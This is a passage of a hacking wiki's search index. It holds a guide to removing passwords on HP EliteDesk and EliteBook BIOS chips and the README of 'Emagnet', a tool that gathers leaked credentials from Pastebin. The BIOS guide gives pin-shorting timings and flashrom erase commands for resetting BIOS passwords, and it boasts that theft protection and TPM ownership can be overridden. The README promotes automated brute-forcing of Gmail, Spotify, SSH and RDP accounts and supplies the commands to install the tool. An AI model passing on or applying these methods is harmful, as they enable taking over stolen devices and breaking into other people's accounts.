fun."},{"location":"hacking/bios/hp_device_and_bios-hacking/#lets-try-short-circuit-the-chip","text":"There is alot of people trying this already since the protection has been very good (Started with Probooks), but no public releases for the latest HP devices has been found. Good question below and good answer was provided on the url below, it simply depends! Again, be careful \"Long story short when testing some IC chips in circuit and powered on I must have touched a couple legs at once causing a chip to short. My quick question, is this damage usually contained just to the chip itself or does it spread to surrounding resistors and capacitors etc.? No smoke or burnt components or anything like that.\" Q: Is this damage usually contained just to the chip itself or does it spread to surrounding resistors and capacitors etc? A: It Depends.... It's a very hard question to answer, really. Hack to learn not learn to hack and you will figure out ;) IC Chip short circuit repercussions","title":"Lets Try Short Circuit the Chip"},{"location":"hacking/bios/hp_device_and_bios-hacking/#hp-elitedesk-800-gx--g5-dangerous-method","text":"Born On Date................: ` 2022 -03-01 ` Secured by latest features..: ` yes ` Bios Chip...................: ` 25B127DSIG ` BiosProgrammer..............: ` CH341a ` Require Bios Programmer.....: ` no ` Level of difficulty.........: ` simple ` * Tools Recommended: Microscope so you can watch the legs so you are not shortcuits the wrong one by mistake * Tools Required..............: 1x Phillips screwdriver 1x Tiny wire ( I used 2 mini grabbers for safety ) G5 has extra features then older elitebooks for bios password. It is possible to set security settings to \"Ignore\" the cmos jumper and reset reset button if pressed on motherboard. If the setting is set to IGNORE you are fucked, you will NOT not succeed in getting around without programmers. so if you try on this unit and do not understand why it does not work, it is precisely because it can ignore this that many other Elitedesk can NOT.","title":"HP EliteDesk 800 GX + G5 (DANGEROUS METHOD)"},{"location":"hacking/bios/hp_device_and_bios-hacking/#the-clip-is-easy-to-find-its-under-the-below-nvme-disk-if-you-have-two-and-you-can-read-the-chip-via-a-soic-clip-8","text":"THIS WILL BRICK YOUR PC - DO IT ON YOUR OWN RISK!! PLEASE NOTICE THE LEGS 1, 7, 8 are from my PICTURE, NOT FROM THE DATASHEET!!! A wire on pin 1 and 7 for ~1.2s erased Intel Firmware A wire on pin 1 and 8 for ~1.0s bios noticed something happend and restore itself A wire on leg 1 and 8 for ~3.0s erased Bios Password","title":"The clip is easy to find, its under the below nvme disk (if you have two) and you can read the chip via a Soic Clip 8"},{"location":"hacking/bios/hp_device_and_bios-hacking/#pins","text":"","title":"Pins"},{"location":"hacking/bios/hp_device_and_bios-hacking/#impressive-i-was-wrong-about-all-this-well-well-after-1-touch-on-pin-1-and-8-notice-just-a-touch-like-in-01ms-we-gonna-see-below","text":"I still don't trust their shit so before I saying I was wrong and they won, I try 2. seconds! Since ages back in the days for some reason I know 4.2 seconds will brick the device if we touch the pins. And this is something I just has figured out on many devices, I can't confirm or promise it will work the same for you so dont listen on this if you didnt try and then cry in pm to me I tried to hold a wire on leg 1 and leg 8, now things happens! Bios missmatch! Now its dangerous, and I'm not as impressed anymore. One more wrong and things will be bricked, Now it's 50/50 .. HP or wuseman, who's right? It will not be a fourth time I know from past experience.","title":"Impressive, I was wrong about all this, well well. After 1 touch on pin 1 and 8 (notice just a touch like in 0.1ms) we gonna see below"},{"location":"hacking/bios/hp_device_and_bios-hacking/#fuck-it-im-to-curios-and-since-ages-i-know-42-seconds-is-the-limit-for-break-things-as-i-said-so-i-decided-to-try-30-seconds-while-pc-was-on-running-as-normal","text":"","title":"Fuck it, i\u00b4m to curios and since ages i know 4.2 seconds is the limit for break things as I said so I decided to try: 3.0 seconds while PC was ON running as normal...."},{"location":"hacking/bios/hp_device_and_bios-hacking/#after-30s-i-pull-the-ac-and-keep-it-off-for-25-seconds-the-pc-wont-die-itself-so-you-must-pull-the-ac","text":"REMOVE THE BATTERY BEFORE DOING THIS!","title":"after 3.0s I pull the AC and keep it off for 25 seconds.. The PC wont die itself so you must pull the AC"},{"location":"hacking/bios/hp_device_and_bios-hacking/#holy-maria-it-does-not-even-start","text":"","title":"Holy maria! it does not even start!"},{"location":"hacking/bios/hp_device_and_bios-hacking/#leaving-ac-out-and-pressing-power-button-for-25-seconds-gave-life-to-the-computer-damn-now-it-flashes-red-and-beeps-every-time-the-led-flashes-according-to-the-hp-dev-manual-for-what-3-x-beeps--3-red-flashing-indicates-its-the-cpu-or-gpu-what-the-hell-it-should-be-42-seconds-before-it-breaks-on-cpu-mem-motherboard-bios-or-gpu","text":"","title":"Leaving AC out and pressing power button for 25 seconds, gave life to the computer, damn now it flashes red and beeps every time the led flashes! According to the HP dev manual for what 3 x beeps + 3 red flashing indicates its the CPU or GPU. What the hell? It should be 4.2 seconds before it breaks on cpu, mem, motherboard, bios or gpu!"},{"location":"hacking/bios/hp_device_and_bios-hacking/#fuck-now-things-was-bricked-i-thought","text":"","title":"Fuck, now things was bricked! I thought"},{"location":"hacking/bios/hp_device_and_bios-hacking/#after-device-is-blinking-red-and-fan-had-run-at-10k-rpm-few-times-we-finally-have-device-booting-thumbs-up-hps-manuals-sucks--","text":"","title":"...After device is blinking red and fan had run at 10k rpm few times we finally have device booting, THUMBS UP! HP's manuals sucks! ;-)"},{"location":"hacking/bios/hp_device_and_bios-hacking/#first-screen-we-gonna-see-is-that-date-is-wrong-i-didnt-fix-a-picture-on-this-just-press-continue","text":"","title":"First screen we gonna see is that date is wrong, i didnt fix a picture on this. just press continue"},{"location":"hacking/bios/hp_device_and_bios-hacking/#second-screen-we-gonna-see-is-that-intel-firmware-is-fucked-press-ok","text":"","title":"Second screen we gonna see is that intel firmware is fucked, press ok"},{"location":"hacking/bios/hp_device_and_bios-hacking/#intel-firmware-install-is-in-progress","text":"","title":"Intel firmware install is in progress"},{"location":"hacking/bios/hp_device_and_bios-hacking/#device-reboots-after-a-while-and-reading-bios-up-to-16m-will-start-and-finally-you-will-see-the-below-screen","text":"","title":"Device reboots after a while and reading bios up to 16M will start and finally you will see the below screen."},{"location":"hacking/bios/hp_device_and_bios-hacking/#next-screen-takes-us-to-to-gbe-recovery-will-it-never-ends","text":"","title":"Next screen takes us to to gbe recovery (will it never ends?)"},{"location":"hacking/bios/hp_device_and_bios-hacking/#now-it-want-us-to-upgrade-once-again-i-choose-yes","text":"","title":"Now it want us to upgrade once again, i choose yes"},{"location":"hacking/bios/hp_device_and_bios-hacking/#after-the-shortcuit-and-few-reboot-it-was-time-to-enter-bios-and-see-if-its-password-protects-it-is-gone","text":"","title":"After the shortcuit and few reboot, it was time to enter bios and see if its password protects!! IT IS GONE!"},{"location":"hacking/bios/hp_device_and_bios-hacking/#now-feel-free-to-set-your-own-bios-password-and-then-press-f11-and-choose-network-recovery","text":"Worlds most secured BIOS that has hardware protection was \"hacked\" in ~3.0 second! We are now able to take over windows also! (will be added later) The only question I have to HP is, did you never try this? Do you now understand why I want to have a technical analysis for your tests? You talk about losses, re-start by showing your winnings based on false advertising instead. You are a scam and fooling your customers with fabricated statistics! Fuck you! If HP's bios is the most secure bios in the world that will protect the companies from hackers incl. tpm protections and keys and keep the real black hats away from private data then it's just as true that I'm sitting on the planet \"Jupiter\" and writing this, there are no laws and rules here so therefore I do not break any laws and rules here, ezi! .. Idiots \u2026 *In hps advertising, they are the bad guys, and I the wolf hence the banner! Fuck you HP \u2026 This is just the first part, I will update this repo with MORE proofs of your lies, next up is laptops followed by printers. Stay tuned!","title":"Now, feel free to set your own bios password and then press F11 and choose network recovery"},{"location":"hacking/bios/hp_device_and_bios-hacking/#general-info-about-elitedesks","text":"","title":"General info about Elitedesks!"},{"location":"hacking/bios/hp_device_and_bios-hacking/#there-is-another-switch-on-the-motherboard-its-not-easy-to-find-and-the-switch-is-not-available-wiht-chassi-closed","text":"","title":"There is another switch on the motherboard, its not easy to find and the switch is not available wiht chassi closed"},{"location":"hacking/bios/hp_device_and_bios-hacking/#i-really-recommends-to-use-a-better-clip-then-the-cheap-ones-spend-some-money-for-a-3m-clip-20-30-the-chip-black-ones-from-china-sucks-as-hell-after-2-3-grabs-its-not-possible-to-grab-the-clip-anymore-probably-thats-why-they-sell-those-clips-in-4-6xpackets-on-amazon---dont-buy-those-see-yourself-below-after-few-grabs-it-destroys-the-chip-after-few-times","text":"","title":"I Really recommends to use a \u00b4better clip then the cheap ones, spend some money for a 3M clip ~20-30\u20ac, the chip black ones from china sucks as hell! After 2-3 grabs it's not possible to grab the clip anymore. (probably thats why they sell those clips in 4-6xPackets on amazon - DONT BUY THOSE!!! &gt;See yourself below after FEW grabs, it destroys the chip after few times)"},{"location":"hacking/bios/hp_device_and_bios-hacking/#hp-sure-adminm--hp-sure-run-and-secure-platform-management-is-not-provisioned-anymore","text":"","title":"HP Sure Adminm / HP Sure Run and Secure PLatform Management is not provisioned anymore"},{"location":"hacking/bios/hp_device_and_bios-hacking/#you-are-now-the-full-admin-of-the-system-and-you-can-erase-old-tpm-and-take-over-this-part","text":"","title":"You are now the full admin of the system and you can erase old TPM and take over this part"},{"location":"hacking/bios/hp_device_and_bios-hacking/#followed-by-reset-all-security-featrures-not-eve-theft-protection-will-help-the-owner-we-can-permanent-disable-this-permanent-is-not-permanent-as-forever-we-can-rewrite-the-chip-ofc","text":"","title":"Followed by reset all security featrures, not eve theft protection will help the owner, we can permanent disable this (permanent is not permanent as forever, we can rewrite the chip ofc)"},{"location":"hacking/bios/hp_device_and_bios-hacking/#invalid-manifest","text":"If you got problems with system recovery via F11 and bios gonna say there is a problem with manifest as: \"error finding valid manifest\" do as below (this problem was a mess with my Elitebook 870 G3 to figure out and solve, hp now have a help part for this for several models on their site, not all devices are affected - Visit hp for more info if needed)","title":"Invalid Manifest"},{"location":"hacking/bios/hp_device_and_bios-hacking/#to-avoid-the-issue","text":"Do not initiate a Preboot network enabled feature when the computer is on low battery power. Avoid pressing the power button. Do not use the CTRL+ALT+DEL key combination to restart the computer while a download or upload is in progress. To work around this issue, perform the following steps to reset the IPv4 configuration: 1 . Power on the computer. 2 . Press F3 to enter the 3rd Party Option ROM Management menu. 3 . Navigate to Network Device List -> MAC:xx:xx:xx:xx:xx:xx -> IPv4 Network Configuration. 4 . Uncheck Configured. 5 . Select Save Changes and Exit.","title":"To avoid the issue:**"},{"location":"hacking/bios/hp_device_and_bios-hacking/#help-with-password-removal","text":"I don't know if I will add this part here yet but upload your bios dump to any of the forums and I will help you or someone else will do, I am active there too for this stuff. Please dump the right file and not the firmware file from EFI file. If you really don't know what im talking about, find me on irc and I will remove the password for you, for free, dont pay for things you don't need ;) Cheers!","title":"Help with password removal"},{"location":"hacking/bios/hp_device_and_bios-hacking/#bios-upgrade-via-linux","text":"DOwnload the bios for your device @hp .com extract the .exe file: 7x x spXXXXX.exe mkdir -p /boot/EFI/HP/BIOS/ { New,Previous,Old,Current,Temp } mount /dev/bootPartiton /boot cp spXXXXX.exe/*. { bin,ini } /boot/EFI/HP/BIOS/New unmount /boot/ reboot Now, enter F9 and choose to boot from ifle, choose the correct file. Bios will now upgrade","title":"Bios Upgrade via Linux"},{"location":"hacking/bios/hp_device_and_bios-hacking/#method-2","text":"After you moved the correct file to New path on boot partition Turn off PC, while you holding win+b press power button for 2 seconds, release the power button but keep press win+b Bios upgrade should now start. Happy Upgrading!","title":"Method 2"},{"location":"hacking/bios/hp_device_and_bios-hacking/#hp-elitebook-870-g3-dangerous-method","text":"Belive it or not. You maybe thought it was just luck what I was trying, as I did. So i decided to ask a friend to try in his PC as well. See the result below, brand new laptop: I wont add all pictures again, i will show you the really needed pictures otherwise you can follow the same step as above its the same story for elitebooks with the latest bioses that is self-healing (really latest models only) So .. Short circuit trick is dangerous but I wanted to confirm this for Elitebooks also.. It's no coincidence, it's wuseman power.. nah is not, its because HP fucking sucks! I guess they spent billions of dollars in their ads and their bios is hacking by short cuiiting their bios chip and then we dont even need to fix it, it healing itself! This has to be the dumbest thing I've ever been through. As I said, it also works on elitebook! Same legs from my view, same seconds (3.0seconds) on a different chip, i toke some picture on it with my microscope. See below, no descriptions will be added unless its something I really wanna share since its the same story as above dangerous method. there is fucking expensive clips for WSON chips for ~100-300$, these. If you are careful enough, you can do the same as me, otherwise you have to take the heat gun and solder and stuff.","title":"HP Elitebook 870 G3 (DANGEROUS METHOD)"},{"location":"hacking/bios/hp_device_and_bios-hacking/#same-as-above-but-on-the-elitebook-i-was-able-to-take-a-picture-this-is-how-it-looks-after-we-boots-first-time-when-device-has-been-acting-as-the-elitedesk","text":"Didnt start Caps lock led + numlock led was flashing 7 times ( i will add a video later i cant find it now ) fan runs at 10k rpm or something, rebooting and doing this for few times and we now got into this screen:","title":"Same as above but on the elitebook i was able to take a picture, this is how it looks after we boots first time when device has been acting as the elitedesk"},{"location":"hacking/bios/hp_device_and_bios-hacking/#this-never-happened-on-elitedesks-only-on-elitebook-i-guess-thats-cause-the-software-and-efi-cant-communicate-anymore-since-the-bios-was-erased-and-now-healed","text":"","title":"This never happened on elitedesks only on elitebook, I guess thats cause the software and efi can't communicate anymore since the bios was erased and now healed"},{"location":"hacking/bios/hp_device_and_bios-hacking/#sure-recovery-every-screen-that-will-popup","text":"","title":"Sure Recovery, every screen that will popup"},{"location":"hacking/bios/hp_device_and_bios-hacking/#downloading-bootwmi","text":"","title":"Downloading Boot.wmi"},{"location":"hacking/bios/hp_device_and_bios-hacking/#downloading-bootsdi","text":"","title":"Downloading Boot.sdi"},{"location":"hacking/bios/hp_device_and_bios-hacking/#downloadintg-bcd","text":"","title":"Downloadintg BCD"},{"location":"hacking/bios/hp_device_and_bios-hacking/#device-that-was-hacked-in-30-seconds-and-i-confirmed-the-same-shit-works-on-this-healing-bios-but-i-dont-recommending-anyone-to-try-use-the-safe-method-otherwise-you-may-get-a-broken-cpugpumemmotherboard-or-anything","text":"","title":"Device that was hacked in 3.0 seconds and I confirmed the same shit works on this healing bios. But i don't recommending anyone to try, use the safe method otherwise you may get a broken cpu,gpu,mem,motherboard or anything:"},{"location":"hacking/bios/hp_device_and_bios-hacking/#connect-to-wifi-via-circa-f3-in-bios-menu","text":"WIFI REQUIRED SINCE THERE IS NO ETHERNE INPUT ON THIS ONE","title":"Connect to wifi via CIRCA (F3 in bios menu)"},{"location":"hacking/bios/hp_device_and_bios-hacking/#preparing-hp-setup--windows","text":"","title":"Preparing HP Setup + Windows"},{"location":"hacking/bios/hp_device_and_bios-hacking/#wson-bios-chip","text":"870 G3 chip is a Winbond 25Q256JVEN 2111 6048 CZ900 Tested my new microscope usb, not perfect photos but it was the first time I used it :P Other chips for test the microscrope, they pretty good.","title":"WSON Bios Chip"},{"location":"hacking/bios/hp_device_and_bios-hacking/#now-we-have-a-valid-license-and-activated-windows-10-from-stock-now-go-reinstall-firmware-and-get-the-hell-out-of-windows-nah-we-must-run-some-stuff-here-before-we-do-that-i-will-add-how-we-gonna-take-over-tpm-later","text":"","title":"Now we have a valid license and activated Windows 10 from stock, now go reinstall firmware and get the hell out of Windows (nah, we must run some stuff here before we do that, i will add how we gonna take over TPM later)"},{"location":"hacking/bios/hp_device_and_bios-hacking/#recommended-safe-way-follow-the-same-steps-as-on-elitedesk-but-you-need-either-a-modded-clip-or-a-wson-programmer-here-is-my-modded-one","text":"","title":"Recommended, safe way. Follow the same steps as on elitedesk but you need either a modded clip or a wson programmer, here is my modded one."},{"location":"hacking/bios/hp_device_and_bios-hacking/#my-special-clip-in-progress","text":"Enjoy!","title":"My special clip in progress"},{"location":"hacking/bios/hp_device_and_bios-hacking/#elitebook-820---programmer-required","text":"The Short CIRCUIT will NOT work on this device!!! Use your programmer to dump bios and remove the password with prefered hexedit tool and write it back to device without the the bios password, its now fully unlocked! =D My modded custom clip grabbed this one aswell, you must have the pins outside the clip as on my picture the above for being able to touch the solder from the pins on the board since there is no legs, if you using a default clip it will just grab the black area and it will probably end like the picture below. See the zoomed version what happens with a non-modded / wson clipper (this is for avaoid soldering, that\u00b4s boring rly) .. If you get your clip working, there is better and more serious custom made SOP WSON SOIC VSOP SPI FLASH 8P 1.27mm on stores online, below is the modded ones from stores. Normal price on amazon is ~100-300$ but some stores in asia sell them for ~40$ - I would recommend a such one instead, its rly cool works on ALL 4x2 chips and you wont need solder anymore, connect it to your programmer or ardunio and start hack the bios dump.. I have nothing more to add here, programmer required here and if you short circuit this and think you will succeed, I can promise you, you wont! Already failed on ~2 few years ago and no new bios has been released so just buy a programmer and do it the proper way, but if you really wanna try - Go for it, i don't care and don't ask me for help about this model. Its old and and sucks! Cheers","title":"Elitebook 820 - Programmer required!"},{"location":"hacking/bios/hp_device_and_bios-hacking/#repair-spm","text":"This is only needed if you short circuited the bios, otherwise you can fix this in bios settings under security.","title":"Repair SPM:"},{"location":"hacking/bios/hp_device_and_bios-hacking/#for-fix-the-spm-if-its-not-possible-to-fix-this-from-bios-security-settings-see-below","text":"If you short cuited the chip, the output from below command will be alot of wierd text and looks like a mess. Get-HPSecurePlatformState It should be like: State : NotConfigured Version : 1.0 Nonce : 0 FeaturesInUse : None EndorsementKeyMod : {0, 0, 0, 0...} SigningKeyMod : {0, 0, 0, 0...} For fix this, please see below (it will works if your output is messed up as well, i never saved the output but you will understand what I mean if you get there and typing the command above) - You also needs HP Sure Admin and HP Recovery from HP's download page (will add urls later, search on hp and you will find for now) openssl req -x509 -nodes -newkey rsa:2048 -keyout key.pem -out cert.pem -days 3650 -subj \"/C=US/ST=State/L=City/O=Company/OU=Org/CN=www.example.com\" openssl pkcs12 -inkey key.pem -in cert.pem -export -keypbe PBE-SHA1-3DES -certpbe PBE-SHA1-3DES -out kek.pfx -name \"HP Secure Platform Key Endorsement Certificate\" -passout pass:test openssl req -x509 -nodes -newkey rsa:2048 -keyout key.pem -out cert.pem -days 3650 -subj \"/C=US/ST=State/L=City/O=Company/OU=Org/CN=www.example.com\" openssl pkcs12 -inkey key.pem -in cert.pem -export -keypbe PBE-SHA1-3DES -certpbe PBE-SHA1-3DES -out sk.pfx -name \"HP Secure Platform Signing Key Certificate\" -passout pass:test New-HPSecurePlatformEndorsementKeyProvisioningPayload -EndorsementKeyFile . \\k ek.pfx -EndorsementKeyPassword test ` | Set-HPSecurePlatformPayload New-HPSecurePlatformSigningKeyProvisioningPayload -EndorsementKeyFile . \\k ek.pfx -EndorsementKeyPassword test ` -SigningKeyFile . \\s k.pfx -SigningKeyPassword test | Set-HPSecurePlatformPayload Now please check again : State : ProvisioningInProgress Version : 1 .0 Nonce : 1581536418 FeaturesInUse : None EndorsementKeyMod : { 236 , 247 , 128 , 76 ... } SigningKeyMod : { 194 , 160 , 105 , 233 ... } So this is about it, when working with Secure Platform Management. To view any associated logs, you can use the Get-HPFirmwareAuditLog function. The last thing you may want to do is deprovision. For this, you will need the endorsement key: New-HPSecurePlatformDeprovisioningPayload -EndorsementKeyFile . \\t ests \\t estdata \\n opw \\k ek.pfx ` -EndorsementKeyPassword test | Set-HPSecurePlatformPayload SPM with HPCMSL in the Enterprise So how would you plug HPCMSL in your enterprise to manage SPM? The solution is meant to be management console agnostic, so whether you use SCCM, Intune, Ivanti, or whatever else, these are the basic steps: Install HPCMSL in a secure location, and place your certificates here. Also Install HPCMSL on your managed clients In the secure location, use HPCMSL to generate a secure payload, as described above, using one of the New-* functions. Copy this secure payload to your clients via your process of choice. Do not copy your certificates. On your clients, apply the payload generated in 3. above, via the Set-HPSecurePlatformPayload function. All commands can be found here: Developers Portal","title":"For fix the SPM if its not possible to fix this from bios security settings, see below:"},{"location":"hacking/bios/hp_device_and_bios-hacking/#hacking-bios-password","text":"","title":"Hacking Bios Password"},{"location":"hacking/bios/hp_device_and_bios-hacking/#via-linux","text":"Please visit flashrom for more info if you are a newbie, dont guess anything before you trying. If possible, try on something else that may not brick your PC before you trying on your real pc if you are new in this world: Wel well, download flashrom (i prefer install things from the source and not via package manager with this kind of tools)","title":"Via Linux:"},{"location":"hacking/bios/hp_device_and_bios-hacking/#download-flashrom-and-signature","text":"wget https://download.flashrom.org/releases/flashrom-v1.2.tar.bz2 wget https://download.flashrom.org/releases/flashrom-v1.2.tar.bz2.asc You should next verify that the key's full fingerprint matches that listed on the flashroms website: gpg --verify ... you should know this awk '/SHA512 HASH/{getline;print}' flashrom-v1.2.tar.bz2.asc | sha512sum --check flashrom-v1.2.tar.bz2: OK flashrom-v1.2.tar.bz2.asc: OK","title":"Download flashrom and Signature"},{"location":"hacking/bios/hp_device_and_bios-hacking/#extract-flashrom","text":"tar -xvf flashrom-v1.2.tar.bz2 or if wanna skip the signature part, downaload and extract via stdin wget -c https://download.flashrom.org/releases/flashrom-v1.2.tar.bz2 -O - | sudo tar -xj","title":"Extract flashrom"},{"location":"hacking/bios/hp_device_and_bios-hacking/#install-flashrom","text":"cd flashrom-v1.2 make -j $( nproc )","title":"Install flashrom"},{"location":"hacking/bios/hp_device_and_bios-hacking/#if-there-is-no-errors-move-on-with-make-install-and-now-use-your-programmer-see-available-programmers-via-typing-flashrom-only-and-you-will-get-all-available-programmers","text":"Now lets continue This is the The Secure/Recommended/Best way to erase the bios password by dump the current bios file, remove the password via prefered hexeditor, write the hacked dump without any password back to chip, voila - Done! Well, its not that easy maybe but follow below steps and everything will be fine :)","title":"If there is no errors, move on with make install and now, use your programmer, see available programmers via typing flashrom only and you will get all available programmers"},{"location":"hacking/bios/hp_device_and_bios-hacking/#flashrom-will-detect-your-chip-and-know-its-model-by-itself","text":"Read Chip flashrom -p ch341a_spi -r Read and Backup* flashrom -p ch341a_spi -r -o bios_elitebook_backup.bin or flashrom -p ch341a_spi -r > bios_elitebook_backup.bin","title":"Flashrom will detect your chip and know its model by itself:"},{"location":"hacking/bios/hp_device_and_bios-hacking/#now-erase-the-bios-with-password-protected-bios","text":"flashrom -p ch341a_spi -E You don't need to remove the password from the bin file from a hexeditor, bios will \"heal\" itself.. Please try. If im wrong, just remove the password via hexedit (this will not be covered in this repo at the moment, will add a tutorial how you can do this without uploading your file for help later) and re-write the chip:","title":"Now erase the bios with password protected bios"},{"location":"hacking/bios/hp_device_and_bios-hacking/#not-needed-if-you-are-on-latest-models-but-in-case-you-wanna-do-it","text":"flashrom -p ch341a_spi -w hacked_bios_file_with_no_pw.bin","title":"Not needed if you are on latest models, but in case you wanna do it:"},{"location":"hacking/bios/hp_device_and_bios-hacking/#on-older-bios-versions-you-must-crack-the-password-or-remove-the-password-from-bios-file-with-a-hexeditor","text":"\u26a0 READ + SAVE YOUR BIOS BEFORE YOU ERASING IT IN CASE SOMETHING GOES WRONG!","title":"On older bios versions, you must crack the password OR remove the password from bios file with a hexeditor"},{"location":"hacking/bios/hp_device_and_bios-hacking/#windows","text":"Download NeoProgrammer v2.2.0.10 and put the clip on the chip, read bios for backup and then erase it, done!","title":"Windows"},{"location":"hacking/bios/hp_device_and_bios-hacking/#on-older-bios-versions-you-must-crack-the-password-or-remove-the-password-from-bios-file-with-a-hexeditor-and-write-the-new-bios-file-to-the-chip---you-should-know-how-to-do-this-if-you-reading-this","text":"","title":"On older bios versions, you must crack the password OR remove the password from bios file with a hexeditor and write the new bios file to the chip - You should know how to do this if you reading this."},{"location":"hacking/bios/hp_device_and_bios-hacking/#more-devices-will-be-added-to-be-continued","text":"","title":"More devices will be added, to be continued!"},{"location":"hacking/bios/hp_device_and_bios-hacking/#advanced-tools--recommended-tools---windows","text":"Greetings to Jeff, all resepect! RWEverything - All versions \u2026 Alot more to be added very soon","title":"Advanced Tools / Recommended Tools - Windows:"},{"location":"hacking/bios/hp_device_and_bios-hacking/#hp-urls","text":"HP BIOS Configuration Utility HP BIOS Configuration Utility FAQ Client Management Script Library","title":"HP Urls:"},{"location":"hacking/bios/hp_device_and_bios-hacking/#references","text":"Daniel Enberg - How To Deploy HP BIOS Settings Using SCCM and HP BIOS Configuration Utility Some HP Laptops Have A Hidden Keylogger That Hackers Can Activate August, 2010 - Bios Password Hack for HP EliteBook Part 1","title":"References"},{"location":"hacking/bios/hp_device_and_bios-hacking/#license","text":"This project is licensed under the GNU General Public License v3.0 - see the LICENSE.md file for details\u2026","title":"License"},{"location":"hacking/bios/hp_device_and_bios-hacking/#contact","text":"If you have problems, questions, ideas or suggestions please contact me on * wuseman@nr1.nu - For faster contact visit Libera irc network or the webchat and type '/msg wuseman hi!' in the input bar and I will reply to you ASAP. Enter Libera's network via your own client 'chat.libera.chat:+6697 or use their new web client here .","title":"Contact"},{"location":"hacking/bruteforce/","text":"bruteforce Everything related to bruteforcing will be found here","title":"bruteforce"},{"location":"hacking/bruteforce/#bruteforce","text":"Everything related to bruteforcing will be found here","title":"bruteforce"},{"location":"hacking/bruteforce/emagnet/","text":"EMAGNET v3.4.3 Before using Emagnet, please remember that with great power comes great responsibility. Current Version News Tested On 3.4.3 More than twice as fast as the previous version Linux/MacOS/OpenWRT/Windows/Android 3.4.2 Support for scraping via API has been added Linux/MacOS/OpenWRT/Windows/Android 3.4.1 Support for SSH Tunnel/Socks5 proxy Linux/MacOS/OpenWRT/Windows/Android 3.4 Full support on android devices, no root required Linux/MacOS/OpenWRT/Windows/Android Visit releases for more info about the beta script. Notice: Pastebin patched the vulnerability I previously used in order to get recent uploads from https://pastebin.com/archive , so at the moment it is not possible to get recently uploaded files, you are now limited to all syntaxes exempt the default one (95% get's uploaded as 'text' and this is removed from all recent upload lists). Currently working on a new way to share all recent uploads for free. Pastebin on Twitter: https://twitter.com/pastebin/status/1250472977491091457 Read their terms of service here before this decision: https://web.archive.org/web/20200410004902/https://pastebin.com/doc_terms_of_service 4. Services Usage Limits You agree not to reproduce, duplicate, copy, sell, resell or exploit any portion of the Service, use of the Service, or access to the Service without Pastebin's express written permission. Scraping refers to extracting data from our Website via an automated process, such as a bot or webcrawler. It does not refer to the collection of information through Pastebin's API. You may scrape the website for the following reasons: Researchers may scrape public, non-personal information from Pastebin for research purposes, only if any publications resulting from that research are open access. Archivists may scrape Pastebin for public data for archival purposes. You may not scrape Pastebin for spamming purposes, including for the purposes of selling Pastebin users' personal information, such as to recruiters, headhunters, and job boards. All use of Pastebin data gathered through scraping must comply with the Pastebin Privacy Statement. Emagnet users are archivists! Right ? We didn't get the recent uploads from scrape.pastebin.com , we used pastebin.com/archive , this means our usage was in compliance with the privacy statements. Whatever, this means that the Emagnet project has ended up in a pause phase as we will not go much further until this changes, but just wait. Soon the greed will come and they will open the pro section again. They can not run this service for free for too long. BBC NEWS: \"Pastebin: Running the site where hackers publicise their attacks\" Emagnet is the No.1 tool for fetching leaks from Pastebin About - Emagnet v3.4.3 (2020-07-19) Emagnet is a very powerful tool for capturing email addresses and passwords from leaked databases uploaded on Pastebin. It's almost impossible to find leaked passwords after they're removed from the list on pastebin.com. Either they have been deleted by Pastebin's techs or the upload is just one in the crowd. To be honest it's easier to find a needle in a haystack then find outdated uploads on Pastebin. Parallel downloading! More than twice as fast as the previous version. 555 files downloaded, over ~20.000 accounts found via auto brute-force using one command that takes approximately 4.51 seconds (see proof below) Incredibly good results for successful attacks. There is no other tool nearby that has more successful attempts than Emagnet. Emagnet is quick, easy, unique and awesome! Google used Emagnet's source to analyze their own site about 1year ago, this is how people are trying to attack accounts today. No skills needed, even your grandmother can use Emagnet! Bruteforce ssh targets and Microsoft Remote Desktop clients - extremely fast portscanning to choose our targets with X port open (netcat/xargs) Super easy to add your own tools using inotifywait with Emagnet - See script example here ./emagnet -g gmail will automate the attack for gmail/google accounts only - We skip the rest! Read more on Google's security blog and automated-tools (emagnet) Even 1 year after using Emagnet to analyze Google, it is still the best tool for it's purpose (2020-07-19) (7% using 2FA) If the user does not have 2FA enable, you will succeed! URL To Google's security blog (This was for try 2FA security): Google.com - Security Blog Remember, bruteforcing accounts without the owner's approval violates the law. Emagnet - v3.4.3 (ssh) Emagnet - v3.4.3 (spotify) Emagnet - v3.4.3 (gmail) Getting Started git clone https://github.com/wuseman/emagnet chmod +x emagnet/emagnet.sh bash emagnet/emagnet.sh --emagnet System Requirements Bash - Find more info about bash here Gsed - Find more info about gsed here Gawk - Find more info about gawk here Wget - Find more info about wget here Curl - Find more info about curl here Wiki Sections: About - How everything started. Previews - Previews can be found here. Configurations-&-Installation - Get started with spotify brute forcing - How emagnet will work with your openvpn files. Regex - Tips For Search - How to find your facebook credenticals, if they have been leaked._ Leaked Databases - Various Public Leaks Changelog Versions changelog . Authors: wuseman < wuseman@nr1.nu > License This project is licensed under the GNU General Public License v3.0 - see the LICENSE.md file for details Contact If you have problems, questions, ideas or suggestions please contact me on * wuseman@nr1.nu - For faster contact visit Libera irc network or the webchat and type '/msg wuseman hi!' in the input bar and I will reply to you ASAP. Enter Libera's network via your own client 'chat.libera.chat:+6697 or use their new web client here . Notice Attacking different kinds of accounts via Emagnet that you have not been granted permission to attack is strictly prohibited and it breaks the law. The punishment is grave and you can even get into prison in some countries just for trying to attack for intrusion. That said, it's important that all users are aware of this and when you have cloned or downloaded the repository it's fully up to you to take responsibility for your actions. Wuseman cannot be held responsible for the actions of any user, all users using Emagnet do so at their own responsibility. Developer: \"All my previews where a brute force attack has been done is under controlling forms with 100% fully permissions by the owners. If you have any questions about this then you are welcome to contact me or the owner.\" Haters Gonna Hate If you are one of these who dislikes EMAGNET and believe the program has been developed for a reason that would break the law then I am not interested in your opinions, keep them to yourself ! Emagnet does NOT leak any data either to the developer(s) or anyone else. There are no statistics used to track any user so if you want to contact me to ask about them, it is completely useless since I really have no idea, and to be honest I don't care. Feel free to read the history about Emagnet here and how this project started. Development of Emagnet is active and it is updated frequently, please use the latest version for fixed issues/bugs. **Special thanks to m1st for delivering legit leaks to us daily** Cheers! Feel free to send donations if you want to support the development of Emagnet Please contact me before you send a donation at: wuseman@nr1.nu Emagnet is a private project since 2015 and was released in June @ 2018, to be continued. Note to all the people that are trying to sell public leaks and steal hackers' jobs: f*ck you! This is one reason why I started this project, I hope this project will get widely spreaded so you will earn 0.00$ on your re-edited malware shit!","title":"EMAGNET v3.4.3"},{"location":"hacking/bruteforce/emagnet/#emagnet-v343","text":"","title":"EMAGNET v3.4.3"},{"location":"hacking/bruteforce/emagnet/#before-using-emagnet-please-remember-that-with-great-power-comes-great-responsibility","text":"","title":"Before using Emagnet, 